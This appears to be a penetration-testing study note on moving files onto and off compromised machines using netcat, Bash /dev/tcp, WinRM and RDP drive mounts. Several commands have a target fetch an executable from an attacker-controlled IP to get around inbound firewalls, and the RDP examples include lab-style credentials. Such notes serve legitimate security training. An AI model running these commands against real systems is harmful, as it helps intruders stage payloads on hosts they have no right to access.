# Miscellaneous File Transfer Methods

## Methods Covered

```
Netcat/Ncat → /dev/tcp (no nc) → PowerShell Remoting (WinRM) → RDP Drive Mount
```

---

## 1. Netcat / Ncat File Transfer

Two directions — choose based on which way the firewall allows connections.

### Method A: Target Listens, Attacker Sends

```bash
# Target (compromised) — listen and receive
nc -l -p 8000 > file.exe
ncat -l -p 8000 --recv-only > file.exe   # Ncat version

# Attacker — send file
nc -q 0 192.168.49.128 8000 < file.exe
ncat --send-only 192.168.49.128 8000 < file.exe
```

### Method B: Attacker Listens, Target Connects (bypass inbound firewall)

```bash
# Attacker — listen and serve file
sudo nc -l -p 443 -q 0 < file.exe
sudo ncat -l -p 443 --send-only < file.exe

# Target (compromised) — connect and receive
nc 192.168.49.128 443 > file.exe
ncat 192.168.49.128 443 --recv-only > file.exe
```

### Method C: No nc on Target — Use /dev/tcp

```bash
# Attacker — listen and serve
sudo nc -l -p 443 -q 0 < file.exe
# OR
sudo ncat -l -p 443 --send-only < file.exe

# Target — receive via pure Bash
cat < /dev/tcp/192.168.49.128/443 > file.exe
```

**nc vs ncat flags:**

| Action | nc flag | ncat flag |
| --- | --- | --- |
| Close after send | `-q 0` | `--send-only` |
| Close after receive | *(auto)* | `--recv-only` |

---

## 2. PowerShell Remoting (WinRM) — Windows to Windows

Useful when HTTP/HTTPS/SMB are all blocked. Uses **TCP 5985** (HTTP) or **TCP 5986** (HTTPS).

```powershell
# Step 1: Confirm WinRM port is open
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Step 2: Create PS session
$Session = New-PSSession -ComputerName DATABASE01

# Step 3: Copy file TO remote machine
Copy-Item -Path C:\file.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Step 4: Copy file FROM remote machine
Copy-Item -Path "C:\Users\Administrator\Desktop\file.txt" -Destination C:\ -FromSession $Session
```

**Requirements:** Admin rights on target, or member of `Remote Management Users` group.

---

## 3. RDP File Transfer

### Copy-Paste (simplest)

Right-click file → Copy → Paste inside RDP session (may not always work)

### Mount Local Folder into RDP Session (reliable)

```bash
# Using rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/files'

# Using xfreerdp
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/user/filetransfer
```

Access mounted folder inside Windows RDP session:

```
\\tsclient\linux
```

> ⚠️ Windows Defender may delete malicious files from your **local** mounted folder — be careful
> 

---

## Quick Reference

| Method | Port | OS | Best When |
| --- | --- | --- | --- |
| nc (target listens) | Any | Both | Attacker can reach target |
| nc (attacker listens) | Any | Both | Firewall blocks inbound to target |
| /dev/tcp | Any | Linux | No nc available on target |
| WinRM/PSRemoting | 5985/5986 | Windows | HTTP/SMB blocked, have admin |
| RDP drive mount | 3389 | Windows | Already have RDP access |

---

## Key Takeaways

- **Netcat direction matters** — if firewall blocks inbound, flip it: attacker listens, target connects
- `/dev/tcp` = zero-tool fallback when no nc on Linux target, just needs Bash
- **WinRM** = underutilized but powerful for Windows-to-Windows internal transfers
- RDP drive mount via **xfreerdp** = clean way to move files during GUI-based engagements
- Mounted RDP drives are **only visible to your session** — other users on the machine can't see it